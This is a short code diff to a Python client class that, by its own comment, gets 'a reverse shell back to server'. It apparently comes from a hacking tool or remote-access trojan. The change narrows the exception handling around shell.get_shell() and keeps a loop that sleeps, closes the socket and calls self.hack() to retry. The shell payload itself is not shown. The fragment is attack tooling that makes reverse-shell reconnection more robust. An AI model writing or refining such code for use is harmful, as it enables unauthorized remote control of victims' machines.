@@ -38,8 +38,7 @@ class Client:
         # Get a reverse shell back to server
         try:
             shell.get_shell()
-        except:
-            print(Exception)
+        except socket.error:
             time.sleep(5) # Wait 5s
             sock.close() # Close erroneous connection
             self.hack() # Retry
